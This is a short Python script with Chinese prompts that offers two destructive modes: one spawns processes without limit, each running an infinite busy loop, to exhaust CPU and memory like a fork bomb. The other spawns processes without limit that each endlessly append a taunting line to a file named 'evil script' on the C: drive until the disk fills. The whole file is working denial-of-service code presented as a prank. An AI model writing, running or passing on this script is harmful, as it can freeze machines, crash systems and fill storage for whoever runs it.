import multiprocessing
def fun_1():
    while True:
        pass
def fun_2():
    while True:
        with open('C:\邪恶脚本.txt','a+')as f:
            f.write('你好 您的硬盘炸了吗\n')
            f.flush()
if __name__ == '__main__':
    print('1:CUP(内存)爆炸\n2:硬盘爆炸')
    user = input('请选择:')
    if user == '1':
        while True:
            p1 = multiprocessing.Process(target=fun_1)
            p1.start()
    elif user == '2':
        while True:
            p1 = multiprocessing.Process(target=fun_2)
            p1.start()
    else:
        print('输入错误')



